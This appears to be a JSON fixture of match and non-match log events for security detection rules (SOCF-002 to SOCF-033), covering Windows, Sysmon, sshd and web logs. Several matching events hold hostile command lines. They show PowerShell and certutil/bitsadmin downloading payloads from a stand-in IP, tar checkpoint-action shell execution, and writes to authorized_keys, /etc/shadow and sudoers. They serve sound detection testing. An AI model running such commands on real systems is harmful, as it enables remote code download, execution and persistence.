[
  {
    "rule_id": "SOCF-002",
    "rule_file": "SOCF-002.yml",
    "match": {
      "timestamp": "2026-07-17T12:00:00Z",
      "event_id": 4740,
      "host": "DC1",
      "username": "alice",
      "ip": "203.0.113.10",
      "message": "A user account was locked out."
    },
    "non_match": {
      "timestamp": "2026-07-17T12:00:00Z",
      "event_id": 4624,
      "host": "DC1",
      "username": "alice",
      "ip": "203.0.113.10",
      "message": "Successful logon."
    }
  },
  {
    "rule_id": "SOCF-003",
    "rule_file": "SOCF-003.yml",
    "match": {
      "timestamp": "2026-07-17T12:01:00Z",
      "event_id": 4728,
      "host": "DC1",
      "actor": "admin01",
      "username": "bob",
      "group_name": "Domain Admins",
      "message": "Member added to Domain Admins."
    },
    "non_match": {
      "timestamp": "2026-07-17T12:01:00Z",
      "event_id": 4728,
      "host": "DC1",
      "actor": "admin01",
      "username": "bob",
      "group_name": "Marketing",
      "message": "Member added to Marketing."
    }
  },
  {
    "rule_id": "SOCF-004",
    "rule_file": "SOCF-004.yml",
    "match": {
      "timestamp": "2026-07-17T12:02:00Z",
      "event_id": 7045,
      "host": "WS-01",
      "service_name": "UpdaterSvc",
      "image_path": "C:\\Windows\\System32\\svchost.exe",
      "service_account": "LocalSystem",
      "message": "A service was installed."
    },
    "non_match": {
      "timestamp": "2026-07-17T12:02:00Z",
      "event_id": 7036,
      "host": "WS-01",
      "service_name": "UpdaterSvc",
      "message": "A service changed state."
    },
    "match_overrides": [
      {},
      {
        "image_path": "C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe"
      },
      {
        "message": "A service was installed referencing rundll32.exe as the executable."
      }
    ]
  },
  {
    "rule_id": "SOCF-005",
    "rule_file": "SOCF-005.yml",
    "match": {
      "timestamp": "2026-07-17T12:03:00Z",
      "event_id": 4698,
      "host": "WS-01",
      "actor": "alice",
      "task_name": "Updater",
      "task_command": "C:\\Windows\\System32\\cmd.exe /c whoami",
      "message": "A scheduled task was created."
    },
    "non_match": {
      "timestamp": "2026-07-17T12:03:00Z",
      "event_id": 4702,
      "host": "WS-01",
      "actor": "alice",
      "task_name": "Updater",
      "message": "A scheduled task was updated."
    },
    "match_overrides": [
      {},
      {
        "message": "A scheduled task was created referencing rundll32 in its description."
      }
    ]
  },
  {
    "rule_id": "SOCF-006",
    "rule_file": "SOCF-006.yml",
    "match": {
      "timestamp": "2026-07-17T12:04:00Z",
      "event_id": 4624,
      "host": "WS-01",
      "username": "alice",
      "ip": "198.51.100.77",
      "logon_type": 10,
      "message": "Successful logon. Logon Type: 10."
    },
    "non_match": {
      "timestamp": "2026-07-17T12:04:00Z",
      "event_id": 4624,
      "host": "WS-01",
      "username": "alice",
      "ip": "198.51.100.77",
      "logon_type": 3,
      "message": "Successful logon. Logon Type: 3."
    }
  },
  {
    "rule_id": "SOCF-007",
    "rule_file": "SOCF-007.yml",
    "match": {
      "timestamp": "2026-07-17T12:05:00Z",
      "event_id": 4720,
      "host": "DC1",
      "actor": "admin01",
      "target_user": "svc-backup",
      "ip": "198.51.100.77",
      "message": "A user account was created."
    },
    "non_match": {
      "timestamp": "2026-07-17T12:05:00Z",
      "event_id": 4726,
      "host": "DC1",
      "actor": "admin01",
      "target_user": "svc-backup",
      "message": "A user account was deleted."
    },
    "match_overrides": [
      {},
      {
        "message": "A new admin-style test account was created."
      }
    ]
  },
  {
    "rule_id": "SOCF-008",
    "rule_file": "SOCF-008.yml",
    "match": {
      "timestamp": "2026-07-17T12:06:00Z",
      "event_id": 4732,
      "host": "DC1",
      "actor": "admin01",
      "target_user": "svc-backup",
      "group_name": "Administrators",
      "ip": "198.51.100.77",
      "message": "A member was added to a security-enabled local group. Group: Administrators."
    },
    "non_match": {
      "timestamp": "2026-07-17T12:06:00Z",
      "event_id": 4732,
      "host": "DC1",
      "actor": "admin01",
      "target_user": "bob",
      "group_name": "Marketing",
      "message": "A member was added to a distribution group. Group: Marketing."
    },
    "match_overrides": [
      {},
      {
        "event_id": 4756
      }
    ]
  },
  {
    "rule_id": "SOCF-009",
    "rule_file": "SOCF-009.yml",
    "match": {
      "timestamp": "2026-07-17T12:07:00Z",
      "event_id": 1102,
      "host": "WS-01",
      "actor": "svc-backup",
      "ip": "198.51.100.77",
      "message": "The audit log was cleared."
    },
    "non_match": {
      "timestamp": "2026-07-17T12:07:00Z",
      "event_id": 4624,
      "host": "WS-01",
      "actor": "svc-backup",
      "message": "Successful logon."
    }
  },
  {
    "rule_id": "SOCF-010",
    "rule_file": "SOCF-010.yml",
    "match_overrides": [
      {
        "username": "alice"
      },
      {
        "username": "bob"
      },
      {
        "username": "carol"
      },
      {
        "username": "dave"
      },
      {
        "username": "erin"
      }
    ],
    "match": {
      "timestamp": "2026-07-17T12:08:00Z",
      "event_id": 4625,
      "host": "DC1",
      "username": "alice",
      "src_ip": "203.0.113.55",
      "ip": "203.0.113.55",
      "message": "An account failed to log on."
    },
    "non_match": {
      "timestamp": "2026-07-17T12:08:00Z",
      "event_id": 4624,
      "host": "DC1",
      "username": "alice",
      "src_ip": "203.0.113.55",
      "message": "An account successfully logged on."
    }
  },
  {
    "rule_id": "SOCF-011",
    "rule_file": "SOCF-011.yml",
    "match": {
      "timestamp": "2026-07-17T12:09:00Z",
      "event_id": 4688,
      "host": "WS-01",
      "username": "alice",
      "process_name": "powershell.exe",
      "parent_process": "explorer.exe",
      "command_line": "powershell.exe -NoP -W Hidden -enc SQBFAFgA",
      "message": "New process powershell.exe -enc SQBFAFgA"
    },
    "non_match": {
      "timestamp": "2026-07-17T12:09:00Z",
      "event_id": 4688,
      "host": "WS-01",
      "username": "admin01",
      "process_name": "powershell.exe",
      "command_line": "powershell.exe Get-Service WinDefend",
      "message": "New process powershell.exe Get-Service WinDefend"
    },
    "match_overrides": [
      {},
      {
        "command_line": "powershell.exe -NoP -W Hidden Invoke-WebRequest -Uri http://198.51.100.77/payload.ps1"
      }
    ]
  },
  {
    "rule_id": "SOCF-012",
    "rule_file": "SOCF-012.yml",
    "match": {
      "timestamp": "2026-07-17T12:10:00Z",
      "event_id": 4688,
      "host": "WS-01",
      "username": "alice",
      "process_name": "svchost.exe",
      "parent_process": "explorer.exe",
      "image_path": "C:\\Users\\alice\\AppData\\Roaming\\svchost.exe",
      "command_line": "C:\\Users\\alice\\AppData\\Roaming\\svchost.exe",
      "message": "New process from AppData."
    },
    "non_match": {
      "timestamp": "2026-07-17T12:10:00Z",
      "event_id": 4688,
      "host": "WS-01",
      "username": "alice",
      "process_name": "svchost.exe",
      "image_path": "C:\\Windows\\System32\\svchost.exe",
      "command_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
      "message": "New process from System32."
    },
    "match_overrides": [
      {},
      {
        "message": "New process launched from \\Users\\alice\\AppData\\Roaming\\ directory, unusual for this host."
      }
    ]
  },
  {
    "rule_id": "SOCF-023",
    "rule_file": "SOCF-023.yml",
    "match": {
      "timestamp": "2026-08-29T12:00:00Z",
      "event_id": 4624,
      "host": "WS-ENG-01",
      "username": "alice",
      "ip": "198.51.100.77",
      "logon_type": 10,
      "message": "An account was successfully logged on. Logon Type: 10."
    },
    "non_match": {
      "timestamp": "2026-08-29T12:00:00Z",
      "event_id": 4624,
      "host": "WS-ENG-01",
      "username": "alice",
      "ip": "10.0.5.23",
      "logon_type": 10,
      "message": "An account was successfully logged on. Logon Type: 10."
    }
  },
  {
    "rule_id": "SOCF-024",
    "rule_file": "SOCF-024.yml",
    "match": {
      "timestamp": "2026-08-29T12:01:00Z",
      "event_id": 4688,
      "host": "WS-ENG-01",
      "username": "alice",
      "process_name": "whoami.exe",
      "command_line": "whoami.exe /all",
      "message": "A new process has been created. New Process Name: whoami.exe."
    },
    "non_match": {
      "timestamp": "2026-08-29T12:01:00Z",
      "event_id": 4688,
      "host": "WS-ENG-01",
      "username": "alice",
      "process_name": "net.exe",
      "command_line": "net.exe use \\\\host\\share",
      "message": "A new process has been created. New Process Name: net.exe."
    }
  },
  {
    "rule_id": "SOCF-025",
    "rule_file": "SOCF-025.yml",
    "match": {
      "timestamp": "2026-08-31T12:00:00Z",
      "event_id": 4688,
      "host": "WS-ENG-01",
      "username": "alice",
      "process_name": "certutil.exe",
      "command_line": "certutil.exe -urlcache -split -f http://198.51.100.77/payload.exe out.exe",
      "message": "A new process has been created. New Process Name: certutil.exe."
    },
    "non_match": {
      "timestamp": "2026-08-31T12:00:00Z",
      "event_id": 4688,
      "host": "WS-ENG-01",
      "username": "alice",
      "process_name": "certutil.exe",
      "command_line": "certutil.exe -hashfile file.exe SHA256",
      "message": "A new process has been created. New Process Name: certutil.exe."
    },
    "match_overrides": [
      {},
      {
        "message": "A new process has been created referencing -urlcache in its arguments."
      },
      {
        "command_line": "bitsadmin.exe /transfer myjob http://198.51.100.77/payload.exe C:\\Temp\\out.exe"
      },
      {
        "command_line": "bitsadmin.exe /transfer myjob http://198.51.100.77/payload.exe C:\\Temp\\out.exe",
        "message": "A new process has been created running bitsadmin /transfer."
      }
    ]
  },
  {
    "rule_id": "SOCF-026",
    "rule_file": "SOCF-026.yml",
    "match": {
      "timestamp": "2026-09-08T09:00:00Z",
      "event_id": 1,
      "provider": "Microsoft-Windows-Sysmon",
      "host": "WS-BACKUP-01",
      "username": "svc_backup",
      "process_name": "tar.exe",
      "parent_process": "svchost.exe",
      "command_line": "tar.exe -czf C:\\Backups\\notes.tgz --checkpoint=1 --checkpoint-action=exec=powershell.exe notes1.txt notes2.txt",
      "message": "A new process has been created. New Process Name: tar.exe."
    },
    "non_match": {
      "timestamp": "2026-09-08T09:00:00Z",
      "event_id": 1,
      "provider": "Microsoft-Windows-Sysmon",
      "host": "WS-BACKUP-01",
      "username": "svc_backup",
      "process_name": "tar.exe",
      "parent_process": "svchost.exe",
      "command_line": "tar.exe -czf C:\\Backups\\notes.tgz notes1.txt notes2.txt",
      "message": "A new process has been created. New Process Name: tar.exe."
    },
    "match_overrides": [
      {},
      {
        "event_id": 4688,
        "message": "A new process has been created. New Process Name: C:\\Windows\\System32\\tar.exe."
      },
      {
        "command_line": "tar.exe -czf C:\\Backups\\notes.tgz notes1.txt",
        "message": "A new process has been created running tar.exe with arguments referencing --checkpoint-action=exec=cmd.exe."
      },
      {
        "command_line": "cmd.exe /c whoami",
        "message": "A new process has been created. New Process Name: cmd.exe.",
        "parent_process": "tar.exe",
        "process_name": "cmd.exe"
      },
      {
        "command_line": "sh -c proof.sh",
        "message": "A new process has been created.",
        "parent_process": "tar.exe",
        "process_name": "unknown.exe",
        "image_path": "C:\\Windows\\System32\\sh.exe"
      }
    ]
  },
  {
    "rule_id": "SOCF-027",
    "rule_file": "SOCF-027.yml",
    "match": {
      "timestamp": "2026-09-16T03:14:07Z",
      "host": "ubuntu-victim",
      "process_name": "sshd",
      "pid": 8842,
      "username": "dispatch-svc",
      "actor": "dispatch-svc",
      "ip": "203.0.113.7",
      "auth_result": "success",
      "auth_method": "password",
      "invalid_user": false,
      "message": "Accepted password for dispatch-svc from 203.0.113.7 port 51000 ssh2"
    },
    "non_match": {
      "timestamp": "2026-09-16T03:14:07Z",
      "host": "ubuntu-victim",
      "process_name": "sshd",
      "pid": 8842,
      "username": "dispatch-svc",
      "actor": "dispatch-svc",
      "ip": "192.168.128.2",
      "auth_result": "success",
      "auth_method": "password",
      "invalid_user": false,
      "message": "Accepted password for dispatch-svc from 192.168.128.2 port 51000 ssh2"
    },
    "match_overrides": [
      {},
      {
        "auth_result": null
      }
    ]
  },
  {
    "rule_id": "SOCF-028",
    "rule_file": "SOCF-028.yml",
    "match": {
      "timestamp": "2026-09-16T03:20:00.123Z",
      "host": "dispatch-ops01",
      "username": "root",
      "actor": "root",
      "process_name": "tar",
      "exe": "/usr/bin/tar",
      "pid": 4820,
      "ppid": 4812,
      "command_line": "tar -czf backup.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh",
      "message": "execve pid=4820 exe=/usr/bin/tar: tar -czf backup.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh"
    },
    "non_match": {
      "timestamp": "2026-09-16T03:20:00.123Z",
      "host": "dispatch-ops01",
      "username": "root",
      "actor": "root",
      "process_name": "tar",
      "exe": "/usr/bin/tar",
      "pid": 4820,
      "ppid": 4812,
      "command_line": "tar -czf backup.tgz notes1.txt notes2.txt",
      "message": "execve pid=4820 exe=/usr/bin/tar: tar -czf backup.tgz notes1.txt notes2.txt"
    },
    "match_overrides": [
      {},
      {
        "exe": null
      },
      {
        "process_name": "bsdtar-wrapper",
        "exe": "/usr/bin/bsdtar"
      }
    ]
  },
  {
    "rule_id": "SOCF-029",
    "rule_file": "SOCF-029.yml",
    "match": {
      "timestamp": "2026-09-16T03:11:00Z",
      "host": "dispatch-ops01",
      "ip": "203.0.113.7",
      "status_code": 404,
      "uri": "/path-01",
      "message": "GET /path-01 HTTP/1.1"
    },
    "non_match": {
      "timestamp": "2026-09-16T03:11:00Z",
      "host": "dispatch-ops01",
      "ip": "192.168.128.2",
      "status_code": 404,
      "uri": "/favicon.ico",
      "message": "GET /favicon.ico HTTP/1.1"
    },
    "match_overrides": [
      {},
      {"timestamp": "2026-09-16T03:11:01Z", "uri": "/path-02"},
      {"timestamp": "2026-09-16T03:11:02Z", "uri": "/path-03"},
      {"timestamp": "2026-09-16T03:11:03Z", "uri": "/path-04"},
      {"timestamp": "2026-09-16T03:11:04Z", "uri": "/path-05"},
      {"timestamp": "2026-09-16T03:11:05Z", "uri": "/path-06"},
      {"timestamp": "2026-09-16T03:11:06Z", "uri": "/path-07"},
      {"timestamp": "2026-09-16T03:11:07Z", "uri": "/path-08"},
      {"timestamp": "2026-09-16T03:11:08Z", "uri": "/path-09"},
      {"timestamp": "2026-09-16T03:11:09Z", "uri": "/path-10"},
      {"timestamp": "2026-09-16T03:11:10Z", "uri": "/path-11"},
      {"timestamp": "2026-09-16T03:11:11Z", "uri": "/path-12"},
      {"timestamp": "2026-09-16T03:11:12Z", "uri": "/path-13"},
      {"timestamp": "2026-09-16T03:11:13Z", "uri": "/path-14"},
      {"timestamp": "2026-09-16T03:11:14Z", "uri": "/path-15"},
      {"timestamp": "2026-09-16T03:11:15Z", "uri": "/path-16"},
      {"timestamp": "2026-09-16T03:11:16Z", "uri": "/path-17"},
      {"timestamp": "2026-09-16T03:11:17Z", "uri": "/path-18"},
      {"timestamp": "2026-09-16T03:11:18Z", "uri": "/path-19"},
      {"timestamp": "2026-09-16T03:11:19Z", "uri": "/path-20"}
    ]
  },
  {
    "rule_id": "SOCF-030",
    "rule_file": "SOCF-030.yml",
    "match": {
      "timestamp": "2026-09-16T03:11:05Z",
      "host": "dispatch-ops01",
      "ip": "203.0.113.7",
      "status_code": 200,
      "uri": "/.git/HEAD",
      "user_agent": "gobuster/3.8.2",
      "message": "GET /.git/HEAD HTTP/1.1"
    },
    "non_match": {
      "timestamp": "2026-09-16T03:11:05Z",
      "host": "dispatch-ops01",
      "ip": "203.0.113.7",
      "status_code": 200,
      "uri": "/dashboard",
      "user_agent": "Mozilla/5.0",
      "message": "GET /dashboard HTTP/1.1"
    },
    "match_overrides": [
      {},
      {
        "uri": "/.env",
        "message": "GET /.env HTTP/1.1"
      },
      {
        "uri": "/backup.sql",
        "message": "GET /backup.sql HTTP/1.1"
      }
    ]
  },
  {
    "rule_id": "SOCF-031",
    "rule_file": "SOCF-031.yml",
    "match": {
      "timestamp": "2026-09-17T03:20:00.100Z",
      "host": "dispatch-ops01",
      "username": "root",
      "actor": "root",
      "process_name": "sh",
      "exe": "/usr/bin/dash",
      "pid": 6001,
      "path": "/root/.ssh/authorized_keys",
      "message": "write path=/root/.ssh/authorized_keys by pid=6001 exe=/usr/bin/dash"
    },
    "non_match": {
      "timestamp": "2026-09-17T03:20:00.100Z",
      "host": "dispatch-ops01",
      "username": "root",
      "actor": "root",
      "process_name": "sh",
      "exe": "/usr/bin/dash",
      "pid": 6001,
      "path": "/root/.bashrc",
      "message": "write path=/root/.bashrc by pid=6001 exe=/usr/bin/dash"
    }
  },
  {
    "rule_id": "SOCF-032",
    "rule_file": "SOCF-032.yml",
    "match": {
      "timestamp": "2026-09-17T03:21:00.100Z",
      "host": "dispatch-ops01",
      "username": "root",
      "actor": "root",
      "process_name": "vi",
      "exe": "/usr/bin/vi",
      "pid": 6100,
      "path": "/etc/passwd",
      "message": "write path=/etc/passwd by pid=6100 exe=/usr/bin/vi"
    },
    "non_match": {
      "timestamp": "2026-09-17T03:21:00.100Z",
      "host": "dispatch-ops01",
      "username": "root",
      "actor": "root",
      "process_name": "vi",
      "exe": "/usr/bin/vi",
      "pid": 6100,
      "path": "/etc/hosts",
      "message": "write path=/etc/hosts by pid=6100 exe=/usr/bin/vi"
    },
    "match_overrides": [
      {},
      {
        "path": "/etc/shadow",
        "message": "write path=/etc/shadow by pid=6100 exe=/usr/bin/vi"
      },
      {
        "path": "/etc/sudoers.d/90-dispatch-svc",
        "message": "write path=/etc/sudoers.d/90-dispatch-svc by pid=6100 exe=/usr/bin/vi"
      },
      {
        "path": "/etc/cron.d/dispatch-backup",
        "message": "write path=/etc/cron.d/dispatch-backup by pid=6100 exe=/usr/bin/vi"
      },
      {
        "path": "/etc/crontab",
        "message": "write path=/etc/crontab by pid=6100 exe=/usr/bin/vi"
      }
    ]
  },
  {
    "rule_id": "SOCF-033",
    "rule_file": "SOCF-033.yml",
    "match": {
      "timestamp": "2026-09-17T09:00:00Z",
      "host": "DC1",
      "username": "jdoe",
      "ip": "10.0.0.50",
      "event_id": 4769,
      "ticket_encryption_type": "0x17",
      "service_name": "svc-sql",
      "message": "A Kerberos service ticket was requested."
    },
    "match_overrides": [
      {},
      {"timestamp": "2026-09-17T09:00:03Z", "service_name": "svc-web"},
      {"timestamp": "2026-09-17T09:00:06Z", "service_name": "svc-backup"}
    ],
    "non_match": {
      "timestamp": "2026-09-17T09:00:00Z",
      "host": "DC1",
      "username": "jdoe",
      "ip": "10.0.0.50",
      "event_id": 4769,
      "ticket_encryption_type": "0x12",
      "service_name": "svc-sql",
      "message": "A Kerberos service ticket was requested."
    }
  }
]
